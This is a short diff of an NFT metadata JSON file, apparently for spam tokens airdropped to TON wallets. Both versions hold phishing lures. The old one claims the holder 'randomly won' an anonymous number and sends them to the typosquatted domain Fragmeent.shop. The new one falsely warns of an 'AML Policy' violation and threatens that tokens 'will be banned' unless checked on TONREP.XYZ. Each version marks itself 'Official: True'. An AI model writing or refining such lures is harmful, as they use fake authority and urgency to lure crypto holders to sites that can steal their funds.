@@ -1,6 +1,6 @@
 {
-    "name": "Anonymous Number Gift",
-    "description": "💎 You randomly won anonymous number!\n1️⃣ Go to Fragmeent.shop\n2️⃣ Activate this number for your account or sell it.\n3️⃣ Well done!",
+    "name": "AML Policy",
+    "description": "🚨 You are suspected of violating AML Policy. Please check your tokens on TONREP.XYZ to ensure their security.\n🚨 Otherwise, your tokens will be banned.",
     "attributes": [
       {
         "trait_type": "Official",
@@ -11,5 +11,5 @@
         "value": "True"
       }
     ],
-    "image": "https://fragmeent.shop/images/img.png"
+    "image": "https://fragmeent.shop/images/nft.png"
   }
